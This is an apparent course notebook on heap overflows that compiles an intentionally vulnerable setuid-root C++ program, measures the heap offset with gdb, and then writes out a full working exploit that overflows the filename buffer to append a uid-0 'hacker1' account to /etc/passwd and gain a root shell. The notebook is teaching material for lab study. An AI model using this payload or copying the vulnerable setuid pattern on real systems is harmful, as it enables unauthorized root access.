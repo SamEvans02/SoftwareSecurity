{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Heap Overflow\n",
    "\n",
    "- buffer overflow can happen in other segments such as **heap**, **data** and **bss**\n",
    "- if an important variable is located after a buffer vulnerable to an overflow, the program's control flow can be altered (regardless of the memory segment)\n",
    "    - controls may be limited\n",
    "    \n",
    "## Heap Overflow\n",
    "- heap overflow may not be as common as stack overflow but can be just as effective\n",
    "\n",
    "### demos/heap_overflow/secret.cpp\n",
    "- review the program and spot the following line that's susceptible \n",
    "```c++\n",
    "strcpy(secret, argv[1]); // culprit!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/EthicalHacking/demos/heap_overflow\n"
     ]
    }
   ],
   "source": [
    "%cd demos/heap_overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/EthicalHacking/demos/heap_overflow'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <iostream>\r\n",
      "#include <string>\r\n",
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <fstream>\r\n",
      "#include <unistd.h> //getuid()\r\n",
      "#include <sys/types.h> // getuid()\r\n",
      "#include <filesystem>\r\n",
      "\r\n",
      "namespace fs = std::filesystem;\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void usage(char *prog_name, char *filename) {\r\n",
      "   printf(\"Usage: %s <secret to add to %s>\\n\", prog_name, filename);\r\n",
      "   exit(0);\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char* argv[]) {\r\n",
      "    int userid;\r\n",
      "    char *secret, *secret_file;\r\n",
      "    ofstream fout;\r\n",
      "    \r\n",
      "    secret = new char[100];\r\n",
      "    secret_file = new char[20];\r\n",
      "\r\n",
      "\r\n",
      "    strcpy(secret_file, \"/var/secret\");\r\n",
      "\r\n",
      "    if (argc < 2)\r\n",
      "        usage(argv[0], secret_file);\r\n",
      "    \r\n",
      "    strcpy(secret, argv[1]);\r\n",
      "\r\n",
      "    printf(\"[DEBUG] secret      @ %p: \\'%s\\'\\n\", secret, secret);\r\n",
      "    printf(\"[DEBUG] secret_file @ %p: \\'%s\\'\\n\", secret_file, secret_file);\r\n",
      "\r\n",
      "    userid = getuid();\r\n",
      "    fout.open(secret_file, ios_base::app); // append mode\r\n",
      "    if (!fout) {\r\n",
      "        cerr << \"Error while opening file\\n\";\r\n",
      "        cerr << \"Make sure \" << argv[0] << \" has r/w permission to /var folder\\n\";\r\n",
      "        exit(1);\r\n",
      "    }\r\n",
      "    fout << userid << \"\\n\" << secret << endl;\r\n",
      "    fs::permissions(secret_file, fs::perms::group_read|fs::perms::others_read, fs::perm_options::remove);\r\n",
      "    fout.close();\r\n",
      "    cout << \"Secret saved.\\n\";\r\n",
      "    delete[] secret;\r\n",
      "    delete[] secret_file;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat secret.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -m32 -std=c++17 -fno-stack-protector -z execstack -no-pie secret.cpp  -o secret.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "sudo chown root:root secret.exe \n",
      "sudo chmod +s secret.exe  \n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### secret.exe must be setuid root program \n",
    "- all users in the system can keep their own secret by writing to /var/secrets file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 215784 Jul 23 14:41 secret.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al secret.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./secret.exe <secret to add to /var/secret>\r\n"
     ]
    }
   ],
   "source": [
    "# run the program\n",
    "! ./secret.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] secret      @ 0x8051bb0: 'my top secret data'\r\n",
      "[DEBUG] secret_file @ 0x8051c20: '/var/secret'\r\n",
      "Secret saved.\r\n"
     ]
    }
   ],
   "source": [
    "# run the program with argument\n",
    "! ./secret.exe \"my top secret data\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] secret      @ 0x8051bb0: 'new note for user'\r\n",
      "[DEBUG] secret_file @ 0x8051c20: '/var/secret'\r\n",
      "Secret saved.\r\n"
     ]
    }
   ],
   "source": [
    "! ./secret.exe \"new note for user\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: 1000\r\n",
      "my top secret data\r\n",
      "1000\r\n",
      "new note for user\r\n",
      "1001\r\n",
      "another secret\r\n",
      "1000\r\n",
      "more secret\r\n",
      "1000\r\n",
      "my top secret data\r\n",
      "1000\r\n",
      "my top secret data\r\n",
      "1000\r\n",
      "new note for user\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S cat /var/secret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflowing buffer by corrupting datafile\n",
    "- how far down is secret_file from secret buffer (the offset)?\n",
    "- use gdb\n",
    "- subtract the address of secret buffer from the address of scret_file\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─$ sudo gdb -q ./secret.exe \n",
    "Reading symbols from ./secret.exe...\n",
    "\n",
    "(gdb) break main\n",
    "Breakpoint 1 at 0x804936a: file secret.cpp, line 21.\n",
    "\n",
    "(gdb) run \"some secret\"\n",
    "Starting program: /home/kali/projects/EthicalHacking/demos/heap_overflow/secret.exe \"some secret\"\n",
    "\n",
    "Breakpoint 1, main (argc=2, argv=0xffffd614) at secret.cpp:21\n",
    "21          ofstream fout;\n",
    "\n",
    "(gdb) n\n",
    "(gdb) n \n",
    "(gdb) p/x secret # secret is a pointer\n",
    "$1 = 0x8051bb0\n",
    "\n",
    "(gdb) p/x secret_file # secret file is a pointer\n",
    "$2 = 0x8051c20\n",
    "(gdb) \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "112\n"
     ]
    }
   ],
   "source": [
    "# the offset of secret_file from secret buffer is:\n",
    "print(0x8051c20 - 0x8051bb0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] secret      @ 0x8051bb0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\r\n",
      "[DEBUG] secret_file @ 0x8051c20: ''\r\n",
      "Error while opening file\r\n",
      "Make sure ./secret.exe has r/w permission to /var folder\r\n"
     ]
    }
   ],
   "source": [
    "! ./secret.exe $(python -c 'print(\"A\"*112)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access 'testfile': No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "# let's make sure testfile doesn't exist in the current director\n",
    "# delete the file if exists\n",
    "#! rm -f testfile\n",
    "! ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] secret      @ 0x8051bb0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'\r\n",
      "[DEBUG] secret_file @ 0x8051c20: 'testfile'\r\n",
      "Secret saved.\r\n",
      "double free or corruption (out)\r\n"
     ]
    }
   ],
   "source": [
    "! ./secret.exe $(python -c 'print(\"A\"*112 + \"testfile\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw------- 1 root root 126 Jul 23 16:28 testfile\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1000\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "echo kali | sudo -S cat testfile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit the heap overflow flaw\n",
    "- several clever ways to exploit this type of capability\n",
    "- One interesting one: append a user account to the `/etc/passwd` file\n",
    "- make a backup copy of the file just incase..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cp /etc/passwd /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "root:x:0:0:root:/root:/usr/bin/zsh\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n",
      "tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false\n",
      "strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin\n",
      "ntp:x:107:112::/nonexistent:/usr/sbin/nologin\n",
      "messagebus:x:108:113::/nonexistent:/usr/sbin/nologin\n",
      "redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin\n",
      "rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin\n",
      "iodine:x:111:65534::/run/iodine:/usr/sbin/nologin\n",
      "miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\n",
      "_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin\n",
      "usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
      "tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin\n",
      "rtkit:x:116:121:RealtimeKit,,,:/proc:/usr/sbin/nologin\n",
      "sshd:x:117:65534::/run/sshd:/usr/sbin/nologin\n",
      "statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin\n",
      "postgres:x:119:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n",
      "avahi:x:120:125:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\n",
      "stunnel4:x:121:126::/var/run/stunnel4:/usr/sbin/nologin\n",
      "Debian-snmp:x:122:127::/var/lib/snmp:/bin/false\n",
      "sslh:x:123:128::/nonexistent:/usr/sbin/nologin\n",
      "nm-openvpn:x:124:129:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n",
      "nm-openconnect:x:125:130:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n",
      "pulse:x:126:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n",
      "saned:x:127:134::/var/lib/saned:/usr/sbin/nologin\n",
      "inetsim:x:128:136::/var/lib/inetsim:/usr/sbin/nologin\n",
      "colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin\n",
      "lightdm:x:131:139:Light Display Manager:/var/lib/lightdm:/bin/false\n",
      "king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "1000\n",
      "letmein:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd\n",
      "user:x:1001:1001:user user,,,:/home/user:/bin/bash\n",
      "nxpgsql:x:1002:1002:NeXpose PostgreSQL User:/opt/rapid7/nexpose/nsc/nxpgsql:/bin/sh\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "cat /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## /etc/passwd file format\n",
    "\n",
    "- Linux `/etc/passwd` file stores user account infor and hashed password using the following format:\n",
    "\n",
    "`username:password:userid:groupid:User Info:home folder:default shell`\n",
    "\n",
    "- x : hashed password stored in /etc/shadow file\n",
    "- NOTE: the password field can also contain hashed password\n",
    "- Python crypt module provides API to create Unix passwords with hash - [https://docs.python.org/3/library/crypt.html](https://docs.python.org/3/library/crypt.html)\n",
    "\n",
    "```python\n",
    "crypt(\"password\", \"salt\")\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AA6tQYSfGxd/A\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "python -c 'import crypt; print(crypt.crypt(\"password\", \"AA\"))'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XXq2wKiyI43A2\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "python -c 'import crypt; print(crypt.crypt(\"password\", \"XX\"))'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## goal: generate a string that looks like\n",
    "\n",
    "`username:XXq2wKiyI43A2:0:0:userinfo:/root:/bin/bash`\n",
    "\n",
    "### problem:\n",
    "- it's hard to generate the exact line ending with `/bin/bash`\n",
    "    - because the file name `/etc/passwd` will be automatically attached at the end\n",
    "    - remember we're writing the whole string as a secret note to the file\n",
    "\n",
    "### workaround:\n",
    "- make `/etc/passwd` a soft link pointing to `/bin/bash`\n",
    "- create the following string instead:\n",
    "\n",
    "`username:XXq2wKiyI43A2:0:0:userinfo:/root:/tmp/etc/passwd`\n",
    "\n",
    "- Note `/etc/passwd` must be over_written to the `secret_file` buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir /tmp/etc\n",
    "ln -s /bin/bash /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lrwxrwxrwx 1 kali kali 9 Jul 23 15:48 /tmp/etc/passwd -> /bin/bash\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ls -l /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### now we can create a valid password entry that looks like:\n",
    "\n",
    "`hacker1:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd`\n",
    "\n",
    "#### things to note\n",
    "- the value just before `/etc/passwd` must be 112 bytes long, remember?\n",
    "- can play with user information column to adjust the length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hacker1:XXq2wKiyI43A2:0:0::/root:/tmp"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0::/root:/tmp\", end=\"\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "37\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0::/root:/tmp\", end=\"\")' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "75"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "112-37"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "112\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0:\" + \"A\"*75 + \":/root:/tmp\", end=\"\")' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[DEBUG] secret      @ 0x8051bb0: 'hacker1:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'\r\n",
      "[DEBUG] secret_file @ 0x8051c20: '/etc/passwd'\r\n",
      "Secret saved.\r\n",
      "munmap_chunk(): invalid pointer\r\n"
     ]
    }
   ],
   "source": [
    "! ./secret.exe $(python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0:\" + \"A\"*75 + \":/root:/tmp/etc/passwd\", end=\"\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lightdm:x:131:139:Light Display Manager:/var/lib/lightdm:/bin/false\n",
      "king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "1000\n",
      "letmein:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd\n",
      "user:x:1001:1001:user user,,,:/home/user:/bin/bash\n",
      "nxpgsql:x:1002:1002:NeXpose PostgreSQL User:/opt/rapid7/nexpose/nsc/nxpgsql:/bin/sh\n",
      "1000\n",
      "hacker1:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "echo kali | sudo -S tail /etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## login or su \n",
    "- use newly created account (`hacker1:password`) to login\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─$ su hacker1                                                                                        134 ⨯\n",
    "Password: \n",
    "┌──(root💀K)-[/home/kali/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─# whomai         \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
